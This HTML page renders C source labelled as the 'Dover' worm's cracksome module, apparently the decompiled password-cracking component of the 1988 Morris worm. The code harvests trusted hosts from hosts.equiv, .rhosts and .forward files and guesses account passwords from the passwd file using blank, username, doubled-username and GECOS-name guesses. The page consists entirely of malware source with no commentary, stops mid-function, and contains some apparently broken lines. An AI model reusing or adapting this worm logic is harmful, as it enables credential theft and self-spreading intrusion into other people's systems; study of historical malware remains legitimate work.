<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Dover.Worm.Code - CRACKSOM.C.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/* Dover */</span><span class="sc0">

</span><span class="sc9">#include "worm.h"
#include &lt;stdio.h&gt;
#include &lt;ctype.h&gt;
#include &lt;strings.h&gt;
#include &lt;pwd.h&gt;
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cmode</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">h_name2host</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">                    </span><span class="sc1">/* sizeof(usr) == 58 */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">o4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">o8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">o12</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">passwd</span><span class="sc10">[</span><span class="sc4">14</span><span class="sc10">];</span><span class="sc0">                </span><span class="sc1">/* offset 16 */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">decoded_passwd</span><span class="sc10">[</span><span class="sc4">14</span><span class="sc10">];</span><span class="sc0">            </span><span class="sc1">/* 30 */</span><span class="sc0">
    </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">pad</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">homedir</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/* offset 46 */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">gecos</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc1">/* offset 50 */</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* offset 54 */</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc1">/* Ahhh, I just love these names.  Don't change them for anything. */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">x27f28</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">x27f2c</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Crack some passwords. */</span><span class="sc0">
</span><span class="sc11">cracksome</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cmode</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">strat_0</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/* 88 */</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">strat_1</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">try_words</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">dict_words</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Strategy 0, look through /etc/hosts.equiv, and /.rhost for new hosts */</span><span class="sc0">
</span><span class="sc11">strat_0</span><span class="sc10">()</span><span class="sc0">                   </span><span class="sc1">/* 0x5da4 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hosteq</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">scanbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">fwd_buf</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fwd_host</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">getbuf</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">passwd</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pwent</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">local</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hst</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 1048 */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">check_other_cnt</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc1">/* 1052 */</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">user_list</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">hosteq</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"/etc/hosts.equiv"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"r"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hosteq</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">           </span><span class="sc1">/* 292 */</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fscanf</span><span class="sc10">(</span><span class="sc11">hosteq</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%.100s"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">scanbuf</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_name2host</span><span class="sc10">(</span><span class="sc11">scanbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_name2host</span><span class="sc10">(</span><span class="sc11">scanbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">getaddrs</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">      </span><span class="sc1">/* 158 */</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">hosteq</span><span class="sc10">);</span><span class="sc0">             </span><span class="sc1">/* 280 */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">hosteq</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"/.rhosts"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"r"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hosteq</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">           </span><span class="sc1">/* 516 */</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fgets</span><span class="sc10">(</span><span class="sc11">getbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">getbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">hosteq</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc1">/* 344,504 */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sscanf</span><span class="sc10">(</span><span class="sc11">getbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%s"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">scanbuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_name2host</span><span class="sc10">(</span><span class="sc11">scanbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">         </span><span class="sc1">/* 436, 474 */</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_name2host</span><span class="sc10">(</span><span class="sc11">scanbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">getaddrs</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">hosteq</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* look through the passwd file, checking for contact with others every
     * tenth entry. */</span><span class="sc0">
    </span><span class="sc11">setpwent</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">check_other_cnt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">/* 522 */</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">pwent</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getpwent</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">     </span><span class="sc1">/* 526, 1124 */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">check_other_cnt</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">other_sleep</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">check_other_cnt</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">fwd_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%.200s/.forward"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">pwent</span><span class="sc10">-&gt;</span><span class="sc11">pw_dir</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">hosteq</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">fwd_buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"r"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hosteq</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">           </span><span class="sc1">/* 834 */</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fgets</span><span class="sc10">(</span><span class="sc11">scanbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">scanbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">hosteq</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc1">/* 650,822 */</span><span class="sc0">
        </span><span class="sc1">/* Punt the newline */</span><span class="sc0">
        </span><span class="sc10">(&amp;</span><span class="sc11">scanbuf</span><span class="sc10">[</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">scanbuf</span><span class="sc10">)])[-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">fwd_host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">index</span><span class="sc10">(</span><span class="sc11">scanbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fwd_host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_name2host</span><span class="sc10">(++</span><span class="sc11">fwd_host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">h_name2host</span><span class="sc10">(</span><span class="sc11">fwd_host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">getaddrs</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">o48</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">flag</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">hosteq</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc1">/* Don't do foreign or compilcated hosts */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">-&gt;</span><span class="sc11">hostname</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">11</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">user</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pwent</span><span class="sc10">-&gt;</span><span class="sc11">pw_name</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(&amp;</span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">passwd</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"x"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">decoded_passwd</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">homedir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">pwent</span><span class="sc10">-&gt;</span><span class="sc11">pw_dir</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">pwent</span><span class="sc10">-&gt;</span><span class="sc11">pw_dir</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">gecos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">pwent</span><span class="sc10">-&gt;</span><span class="sc11">pw_gecos</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">pwent</span><span class="sc10">-&gt;</span><span class="sc11">pw_gecos</span><span class="sc0">
</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">user_list</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">user_list</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">endpwent</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">cmode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">x27f2c</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">user_list</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Check for 'username', 'usernameusername' and 'emanresu' as passwds. */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">strat_1</span><span class="sc10">()</span><span class="sc0">                </span><span class="sc1">/* 0x61ca */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">usrname</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x27f2c</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">50</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x27f2c</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">x27f2c</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc1">/* 1740 */</span><span class="sc0">
    </span><span class="sc1">/* Every tenth time look for "me mates" */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">other_sleep</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc1">/* Check for no passwd */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_passwd</span><span class="sc10">(</span><span class="sc11">x27f2c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">""</span><span class="sc10">)))</span><span class="sc0">         </span><span class="sc1">/* other_fd+84 */</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">           </span><span class="sc1">/* 1722 */</span><span class="sc0">
    </span><span class="sc1">/* If the passwd is something like "*" punt matching it. */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">x27f2c</span><span class="sc10">-&gt;</span><span class="sc11">passwd</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">13</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">strncpy</span><span class="sc10">(</span><span class="sc11">usrname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">x27f2c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">usrname</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">usrname</span><span class="sc10">[</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">usrname</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_passwd</span><span class="sc10">(</span><span class="sc11">x27f2c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">usrname</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%.20s%.20s"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">usrname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">usrname</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_passwd</span><span class="sc10">(</span><span class="sc11">x27f2c</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/* 1722 */</span><span class="sc0">
    </span><span class="sc11">sscanf</span><span class="sc10">(</span><span class="sc11">x27f2c</span><span class="sc10">-&gt;</span><span class="sc11">gecos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"%[^ ,]"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">isupper</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]))</span><span class="sc0">
        </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">tolower</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
